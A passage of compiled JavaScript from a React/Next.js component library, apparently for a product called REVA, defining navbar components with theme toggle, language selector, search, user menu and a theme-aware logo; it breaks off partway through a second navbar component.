    var logo = param.logo, _param_items = param.items, items = _param_items === void 0 ? defaultNavItems : _param_items, _param_showSearch = param.showSearch, showSearch = _param_showSearch === void 0 ? false : _param_showSearch, _param_showThemeToggle = param.showThemeToggle, showThemeToggle = _param_showThemeToggle === void 0 ? true : _param_showThemeToggle, _param_showLanguageSelector = param.showLanguageSelector, showLanguageSelector = _param_showLanguageSelector === void 0 ? false : _param_showLanguageSelector, _param_showUserMenu = param.showUserMenu, showUserMenu = _param_showUserMenu === void 0 ? true : _param_showUserMenu, _param_showBalance = param.showBalance, showBalance = _param_showBalance === void 0 ? false : _param_showBalance, _param_showCreateButton = param.showCreateButton, showCreateButton = _param_showCreateButton === void 0 ? false : _param_showCreateButton, _param_showNotifications = param.showNotifications, showNotifications = _param_showNotifications === void 0 ? false : _param_showNotifications, _param_showMessages = param.showMessages, showMessages = _param_showMessages === void 0 ? false : _param_showMessages, _param_balance = param.balance, balance = _param_balance === void 0 ? 0 : _param_balance, user = param.user, _param_languages = param.languages, languages = _param_languages === void 0 ? {
        current: "Eng",
        options: [
            {
                label: "English",
                value: "en"
            },
            {
                label: "Fran\xE7ais",
                value: "fr"
            },
            {
                label: "Espa\xF1ol",
                value: "es"
            }
        ]
    } : _param_languages, onThemeToggle = param.onThemeToggle, onLanguageChange = param.onLanguageChange, onLogout = param.onLogout, onSearch = param.onSearch, className = param.className, _param_isDark = param.isDark, isDark = _param_isDark === void 0 ? false : _param_isDark;
    var pathname = (0, import_navigation2.usePathname)();
    var _React14_useState = _sliced_to_array(React14.useState(false), 2), isSearchOpen = _React14_useState[0], setIsSearchOpen = _React14_useState[1];
    var _React14_useState1 = _sliced_to_array(React14.useState(""), 2), searchQuery = _React14_useState1[0], setSearchQuery = _React14_useState1[1];
    var handleSearch = function(e) {
        e.preventDefault();
        if (onSearch) {
            onSearch(searchQuery);
        }
        setIsSearchOpen(false);
    };
    return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("header", {
        className: cn("sticky top-0 z-50 w-full border-b bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60", className),
        children: /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("div", {
            className: "container flex h-16 items-center",
            children: [
                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Sheet, {
                    children: [
                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(SheetTrigger, {
                            asChild: true,
                            children: /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                variant: "ghost",
                                size: "icon",
                                className: "mr-2 md:hidden",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Menu, {
                                        className: "h-5 w-5"
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                        className: "sr-only",
                                        children: "Toggle menu"
                                    })
                                ]
                            })
                        }),
                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(SheetContent, {
                            side: "left",
                            className: "pr-0",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("div", {
                                    className: "px-7",
                                    children: logo || /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(RevaLogo, {})
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("div", {
                                    className: "mt-8 flex flex-col gap-4",
                                    children: items.map(function(item, index) {
                                        return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(MobileNavItem2, {
                                            item: item,
                                            pathname: pathname
                                        }, index);
                                    })
                                })
                            ]
                        })
                    ]
                }),
                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("div", {
                    className: "mr-4 hidden md:flex",
                    children: logo || /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(RevaLogo, {})
                }),
                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("div", {
                    className: "hidden md:flex",
                    children: /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavigationMenu, {
                        children: /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavigationMenuList, {
                            children: items.map(function(item, index) {
                                return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavbarItem, {
                                    item: item,
                                    pathname: pathname
                                }, index);
                            })
                        })
                    })
                }),
                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("div", {
                    className: "flex flex-1 items-center justify-end gap-2",
                    children: [
                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("div", {
                            className: "hidden md:flex items-center gap-2 mr-2",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Camera, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                            className: "sr-only",
                                            children: "Camera"
                                        })
                                    ]
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Sofa, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                            className: "sr-only",
                                            children: "Room"
                                        })
                                    ]
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Phone, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                            className: "sr-only",
                                            children: "Phone"
                                        })
                                    ]
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.PenLine, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                            className: "sr-only",
                                            children: "Pen"
                                        })
                                    ]
                                })
                            ]
                        }),
                        showSearch && /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("div", {
                            className: "relative hidden md:flex",
                            children: isSearchOpen ? /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("form", {
                                onSubmit: handleSearch,
                                className: "relative",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(Input, {
                                        type: "search",
                                        placeholder: "Search...",
                                        className: "h-9 w-[200px] lg:w-[300px]",
                                        value: searchQuery,
                                        onChange: function(e) {
                                            return setSearchQuery(e.target.value);
                                        }
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                        type: "button",
                                        variant: "ghost",
                                        size: "icon",
                                        className: "absolute right-0 top-0",
                                        onClick: function() {
                                            return setIsSearchOpen(false);
                                        },
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.X, {
                                                className: "h-4 w-4"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                                className: "sr-only",
                                                children: "Close search"
                                            })
                                        ]
                                    })
                                ]
                            }) : /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                variant: "ghost",
                                size: "icon",
                                onClick: function() {
                                    return setIsSearchOpen(true);
                                },
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Search, {
                                        className: "h-5 w-5"
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                        className: "sr-only",
                                        children: "Search"
                                    })
                                ]
                            })
                        }),
                        showLanguageSelector && /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenu, {
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(DropdownMenuTrigger, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                        variant: "ghost",
                                        size: "sm",
                                        className: "gap-1 text-sm font-medium",
                                        children: [
                                            languages.current,
                                            /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.ChevronDown, {
                                                className: "h-4 w-4"
                                            })
                                        ]
                                    })
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(DropdownMenuContent, {
                                    align: "end",
                                    children: languages.options.map(function(language) {
                                        return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onLanguageChange === null || onLanguageChange === void 0 ? void 0 : onLanguageChange(language.value);
                                            },
                                            children: language.label
                                        }, language.value);
                                    })
                                })
                            ]
                        }),
                        showThemeToggle && /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenu, {
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(DropdownMenuTrigger, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                                        variant: "ghost",
                                        size: "icon",
                                        children: [
                                            isDark ? /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Sun, {
                                                className: "h-5 w-5"
                                            }) : /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Moon, {
                                                className: "h-5 w-5"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                                className: "sr-only",
                                                children: "Toggle theme"
                                            })
                                        ]
                                    })
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuContent, {
                                    align: "end",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("light");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Sun, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Light"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("dark");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Moon, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Dark"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("system");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Settings, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "System"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("contrast");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Bell, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "High Contrast"
                                            ]
                                        })
                                    ]
                                })
                            ]
                        }),
                        showNotifications && /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                            variant: "ghost",
                            size: "icon",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Bell, {
                                    className: "h-5 w-5"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                    className: "sr-only",
                                    children: "Notifications"
                                })
                            ]
                        }),
                        showMessages && /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Button, {
                            variant: "ghost",
                            size: "icon",
                            className: "relative",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.MessageSquare, {
                                    className: "h-5 w-5"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(Badge, {
                                    className: "absolute -right-1 -top-1 h-5 w-5 rounded-full p-0 flex items-center justify-center",
                                    children: "3"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("span", {
                                    className: "sr-only",
                                    children: "Messages"
                                })
                            ]
                        }),
                        showBalance && /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("div", {
                            className: "hidden items-center gap-2 md:flex",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Wallet, {
                                    className: "h-4 w-4"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("span", {
                                    className: cn("text-sm font-medium", balance < 0 ? "text-destructive" : ""),
                                    children: [
                                        balance > 0 ? "+" : "",
                                        balance.toLocaleString()
                                    ]
                                })
                            ]
                        }),
                        showCreateButton && /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(Button, {
                            className: "bg-black hover:bg-black/90 text-white",
                            children: "Create"
                        }),
                        showUserMenu && user && /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenu, {
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(DropdownMenuTrigger, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(Button, {
                                        variant: "ghost",
                                        size: "icon",
                                        className: "rounded-full",
                                        children: /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(Avatar, {
                                            className: "h-8 w-8",
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(AvatarImage, {
                                                    src: user.image,
                                                    alt: user.name || "User"
                                                }),
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(AvatarFallback, {
                                                    children: user.initials || "U"
                                                })
                                            ]
                                        })
                                    })
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuContent, {
                                    align: "end",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuLabel, {
                                            children: [
                                                user.name && /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("p", {
                                                    children: user.name
                                                }),
                                                user.email && /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("p", {
                                                    className: "text-xs text-muted-foreground",
                                                    children: user.email
                                                })
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(DropdownMenuSeparator, {}),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuItem, {
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.User, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Profile"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuItem, {
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.Settings, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Settings"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(DropdownMenuSeparator, {}),
                                        /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(DropdownMenuItem, {
                                            onClick: onLogout,
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.LogOut, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Log out"
                                            ]
                                        })
                                    ]
                                })
                            ]
                        })
                    ]
                })
            ]
        })
    });
}
function NavbarItem(param) {
    var item = param.item, pathname = param.pathname;
    if (item.children) {
        return /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(NavigationMenuItem, {
            children: [
                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavigationMenuTrigger, {
                    children: item.title
                }),
                /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavigationMenuContent, {
                    children: /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("ul", {
                        className: "grid w-[400px] gap-3 p-4 md:w-[500px] md:grid-cols-2 lg:w-[600px]",
                        children: item.children.map(function(child) {
                            return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("li", {
                                className: "row-span-3",
                                children: /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavigationMenuLink, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)(import_link3.default, {
                                        href: child.href || "#",
                                        className: "flex h-full w-full select-none flex-col justify-end rounded-md bg-gradient-to-b from-muted/50 to-muted p-6 no-underline outline-none focus:shadow-md",
                                        children: [
                                            child.icon,
                                            /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("div", {
                                                className: "mb-2 mt-4 text-lg font-medium",
                                                children: child.title
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("p", {
                                                className: "text-sm leading-tight text-muted-foreground",
                                                children: child.description
                                            })
                                        ]
                                    })
                                })
                            }, child.title);
                        })
                    })
                })
            ]
        });
    }
    return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavigationMenuItem, {
        children: /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_link3.default, {
            href: item.href || "#",
            legacyBehavior: true,
            passHref: true,
            children: /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(NavigationMenuLink, {
                className: cn(navigationMenuTriggerStyle(), pathname === item.href && "bg-accent text-accent-foreground", item.disabled && "cursor-not-allowed opacity-60"),
                children: item.title
            })
        })
    });
}
function MobileNavItem2(param) {
    var item = param.item, pathname = param.pathname;
    var _React14_useState = _sliced_to_array(React14.useState(false), 2), isOpen = _React14_useState[0], setIsOpen = _React14_useState[1];
    if (item.children) {
        return /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("div", {
            className: "flex flex-col",
            children: [
                /* @__PURE__ */ (0, import_jsx_runtime24.jsxs)("button", {
                    className: "flex items-center justify-between py-2 text-base font-medium",
                    onClick: function() {
                        return setIsOpen(!isOpen);
                    },
                    children: [
                        item.title,
                        /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_lucide_react7.ChevronDown, {
                            className: cn("h-4 w-4 transition-transform", isOpen && "rotate-180")
                        })
                    ]
                }),
                isOpen && /* @__PURE__ */ (0, import_jsx_runtime24.jsx)("div", {
                    className: "ml-4 mt-2 flex flex-col gap-2",
                    children: item.children.map(function(child) {
                        return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_link3.default, {
                            href: child.href || "#",
                            className: cn("py-2 text-sm", pathname === child.href && "font-medium text-primary", child.disabled && "cursor-not-allowed opacity-60"),
                            children: child.title
                        }, child.title);
                    })
                })
            ]
        });
    }
    return /* @__PURE__ */ (0, import_jsx_runtime24.jsx)(import_link3.default, {
        href: item.href || "#",
        className: cn("py-2 text-base font-medium", pathname === item.href && "text-primary", item.disabled && "cursor-not-allowed opacity-60"),
        children: item.title
    });
}
var defaultNavItems = [
    {
        title: "About",
        href: "/about"
    },
    {
        title: "Pricing",
        href: "/pricing"
    },
    {
        title: "Contact",
        href: "/contact"
    }
];
// src/components/new-navbar/new-navbar.tsx
var React15 = __toESM(require("react"));
var import_link5 = __toESM(require("next/link"));
var import_navigation3 = require("next/navigation");
var import_lucide_react8 = require("lucide-react");
// src/components/new-navbar/reva-logo-dark.tsx
var import_next_themes4 = require("next-themes");
var import_image4 = __toESM(require("next/image"));
var import_link4 = __toESM(require("next/link"));
var import_jsx_runtime25 = require("react/jsx-runtime");
function RevaLogo2() {
    var resolvedTheme = (0, import_next_themes4.useTheme)().resolvedTheme;
    var isDarkTheme = resolvedTheme === "dark";
    return /* @__PURE__ */ (0, import_jsx_runtime25.jsx)(import_link4.default, {
        href: "/",
        className: "flex items-center",
        children: isDarkTheme ? /* @__PURE__ */ (0, import_jsx_runtime25.jsx)(import_image4.default, {
            src: "/images/reva-logo.svg",
            alt: "REVA",
            width: 141,
            height: 27,
            className: "h-5 w-auto",
            priority: true
        }) : /* @__PURE__ */ (0, import_jsx_runtime25.jsx)(import_image4.default, {
            src: "/images/reva-logo-dark.svg",
            alt: "REVA",
            width: 160,
            height: 31,
            className: "h-5 w-auto",
            priority: true
        })
    });
}
// src/components/new-navbar/new-navbar.tsx
var import_jsx_runtime26 = require("react/jsx-runtime");
function NewNavbar(param) {
    var logo = param.logo, _param_items = param.items, items = _param_items === void 0 ? defaultNavItems2 : _param_items, _param_showSearch = param.showSearch, showSearch = _param_showSearch === void 0 ? false : _param_showSearch, _param_showThemeToggle = param.showThemeToggle, showThemeToggle = _param_showThemeToggle === void 0 ? true : _param_showThemeToggle, _param_showLanguageSelector = param.showLanguageSelector, showLanguageSelector = _param_showLanguageSelector === void 0 ? false : _param_showLanguageSelector, _param_showUserMenu = param.showUserMenu, showUserMenu = _param_showUserMenu === void 0 ? true : _param_showUserMenu, _param_showBalance = param.showBalance, showBalance = _param_showBalance === void 0 ? false : _param_showBalance, _param_showCreateButton = param.showCreateButton, showCreateButton = _param_showCreateButton === void 0 ? false : _param_showCreateButton, _param_showNotifications = param.showNotifications, showNotifications = _param_showNotifications === void 0 ? false : _param_showNotifications, _param_showMessages = param.showMessages, showMessages = _param_showMessages === void 0 ? false : _param_showMessages, _param_balance = param.balance, balance = _param_balance === void 0 ? 0 : _param_balance, user = param.user, _param_languages = param.languages, languages = _param_languages === void 0 ? {
        current: "Eng",
        options: [
            {
                label: "English",
                value: "en"
            },
            {
                label: "Fran\xE7ais",
                value: "fr"
            },
            {
                label: "Espa\xF1ol",
                value: "es"
            }
        ]
    } : _param_languages, onThemeToggle = param.onThemeToggle, onLanguageChange = param.onLanguageChange, onLogout = param.onLogout, onSearch = param.onSearch, className = param.className, _param_isDark = param.isDark, isDark = _param_isDark === void 0 ? false : _param_isDark;
    var pathname = (0, import_navigation3.usePathname)();
    var _React15_useState = _sliced_to_array(React15.useState(false), 2), isSearchOpen = _React15_useState[0], setIsSearchOpen = _React15_useState[1];
    var _React15_useState1 = _sliced_to_array(React15.useState(""), 2), searchQuery = _React15_useState1[0], setSearchQuery = _React15_useState1[1];
    var handleSearch = function(e) {
        e.preventDefault();
        if (onSearch) {
            onSearch(searchQuery);
        }
        setIsSearchOpen(false);
    };
    return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("header", {
        className: cn("fixed top-0 z-50 w-full border-b bg-background/80 backdrop-blur-lg shadow-sm navbar-glass", className),
        children: /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("div", {
            className: "flex p-4 justify-between w-full h-16 items-center",
            children: [
                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Sheet, {
                    children: [
                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(SheetTrigger, {
                            asChild: true,
                            children: /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                variant: "ghost",
                                size: "icon",
                                className: "mr-2 md:hidden",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Menu, {
                                        className: "h-5 w-5"
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                        className: "sr-only",
                                        children: "Toggle menu"
                                    })
                                ]
                            })
                        }),
                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(SheetContent, {
                            side: "left",
                            className: "pr-0",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("div", {
                                    className: "px-7",
                                    children: logo || /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(RevaLogo2, {})
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("div", {
                                    className: "mt-8 flex flex-col gap-4",
                                    children: items.map(function(item, index) {
                                        return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(MobileNavItem3, {
                                            item: item,
                                            pathname: pathname
                                        }, index);
                                    })
                                })
                            ]
                        })
                    ]
                }),
                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("div", {
                    className: "mr-4 hidden md:flex",
                    children: logo || /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(RevaLogo2, {})
                }),
                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("div", {
                    className: "hidden md:flex",
                    children: /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavigationMenu, {
                        children: /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavigationMenuList, {
                            children: items.map(function(item, index) {
                                return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavbarItem2, {
                                    item: item,
                                    pathname: pathname
                                }, index);
                            })
                        })
                    })
                }),
                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("div", {
                    className: "flex items-center justify-end gap-2",
                    children: [
                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("div", {
                            className: "hidden md:flex items-center gap-2 mr-2",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Camera, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                            className: "sr-only",
                                            children: "Camera"
                                        })
                                    ]
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Sofa, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                            className: "sr-only",
                                            children: "Room"
                                        })
                                    ]
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Phone, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                            className: "sr-only",
                                            children: "Phone"
                                        })
                                    ]
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                    variant: "ghost",
                                    size: "icon",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.PenLine, {
                                            className: "h-5 w-5"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                            className: "sr-only",
                                            children: "Pen"
                                        })
                                    ]
                                })
                            ]
                        }),
                        showSearch && /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("div", {
                            className: "relative hidden md:flex",
                            children: isSearchOpen ? /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("form", {
                                onSubmit: handleSearch,
                                className: "relative",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(Input, {
                                        type: "search",
                                        placeholder: "Search...",
                                        className: "h-9 w-[200px] lg:w-[300px]",
                                        value: searchQuery,
                                        onChange: function(e) {
                                            return setSearchQuery(e.target.value);
                                        }
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                        type: "button",
                                        variant: "ghost",
                                        size: "icon",
                                        className: "absolute right-0 top-0",
                                        onClick: function() {
                                            return setIsSearchOpen(false);
                                        },
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.X, {
                                                className: "h-4 w-4"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                                className: "sr-only",
                                                children: "Close search"
                                            })
                                        ]
                                    })
                                ]
                            }) : /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                variant: "ghost",
                                size: "icon",
                                onClick: function() {
                                    return setIsSearchOpen(true);
                                },
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Search, {
                                        className: "h-5 w-5"
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                        className: "sr-only",
                                        children: "Search"
                                    })
                                ]
                            })
                        }),
                        showLanguageSelector && /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenu, {
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(DropdownMenuTrigger, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                        variant: "ghost",
                                        size: "sm",
                                        className: "gap-1 text-sm font-medium",
                                        children: [
                                            languages.current,
                                            /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.ChevronDown, {
                                                className: "h-4 w-4"
                                            })
                                        ]
                                    })
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(DropdownMenuContent, {
                                    align: "end",
                                    children: languages.options.map(function(language) {
                                        return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onLanguageChange === null || onLanguageChange === void 0 ? void 0 : onLanguageChange(language.value);
                                            },
                                            children: language.label
                                        }, language.value);
                                    })
                                })
                            ]
                        }),
                        showThemeToggle && /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenu, {
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(DropdownMenuTrigger, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                                        variant: "ghost",
                                        size: "icon",
                                        children: [
